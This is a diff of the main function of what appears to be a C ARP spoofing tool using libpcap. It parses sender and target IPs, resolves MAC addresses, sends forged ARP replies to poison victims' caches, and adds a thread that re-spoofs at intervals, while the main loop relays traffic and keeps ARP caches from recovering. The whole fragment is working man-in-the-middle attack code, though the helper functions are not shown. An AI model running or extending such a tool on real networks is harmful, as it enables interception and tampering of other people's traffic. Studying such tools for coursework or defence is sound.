@@ -5,21 +5,19 @@ int main(int argc, char* argv[]) {
     usage();
     return -1;
   }
-  int cnt = (argc - 2) / 2;
-  uint8_t sender_ip[10][4], target_ip[10][4];
+  cnt = (argc - 2) / 2;
   for(int i = 0; i < cnt; i++) {
     //parse ip from argv
     parse_IP(argv[(2*i) + 2], sender_ip[i]);
     parse_IP(argv[(2*i) + 3], target_ip[i]);
 
-    printf("%d sender ip: ", i);
+    printf("%d. sender ip: ", i+1);
     print_IP(sender_ip[i]);
-    printf("%d target ip: ", i);
+    printf("%d. target ip: ", i+1);
     print_IP(target_ip[i]);
   }
 
   //get my ip address
-  uint8_t attacker_ip[4];
   char* dev = argv[1];
   if(get_attacker_IP(dev, attacker_ip) < 0) {
     perror("get attacker ip error");
@@ -29,7 +27,6 @@ int main(int argc, char* argv[]) {
   print_IP(attacker_ip);
 
   //get my mac address
-  uint8_t attacker_mac[6];  
   if(get_attacker_mac(dev, attacker_mac) < 0) {
     perror("get attacker mac error");
     return -1;
@@ -39,7 +36,7 @@ int main(int argc, char* argv[]) {
 
   //open pcap
   char errbuf[PCAP_ERRBUF_SIZE];
-  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+  handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
   if (handle == NULL) {
     fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
     return -1;
@@ -47,29 +44,30 @@ int main(int argc, char* argv[]) {
   
   uint8_t broadcast[6];
   memcpy(broadcast, "\xff", 6);
-  uint8_t sender_mac[10][6];
-  uint8_t target_mac[10][6];
 
   for(int i = 0; i < cnt ; i++) {
   //get sender mac
     send_arp(handle, REQUEST, attacker_ip, sender_ip[i], attacker_mac, broadcast);
     get_mac_by_ip(handle, sender_ip[i], sender_mac[i]);
-    printf("%d sender mac address: ", i);
+    printf("%d. sender mac address: ", i+1);
     print_mac(sender_mac[i]);
 
     //get target mac
     send_arp(handle, REQUEST, attacker_ip, target_ip[i], attacker_mac, broadcast);
     get_mac_by_ip(handle, target_ip[i], target_mac[i]);
-    printf("%d target mac address: ", i);
+    printf("%d. target mac address: ", i+1);
     print_mac(target_mac[i]);
   }
   
+  //arp spoof
   for(int i = 0; i < cnt; i++) {
-    //arp spoof
     send_arp(handle, REPLY, target_ip[i], sender_ip[i], attacker_mac, sender_mac[i]);
-    send_arp(handle, REPLY, sender_ip[i], target_ip[i], attacker_mac, target_mac[i]);
   }
-  
+
+  //arp spoof periodically
+  pthread_t thread;
+  pthread_create(&thread, NULL, arp_spoofing_cycle, NULL);;
+
   //relay and prevent arp recovery
   while(true) {
     struct pcap_pkthdr* header;
@@ -86,6 +84,8 @@ int main(int argc, char* argv[]) {
     }
   }
 
+  int status;
+  pthread_join(thread, (void**)&status);
   return 0;
 }
 
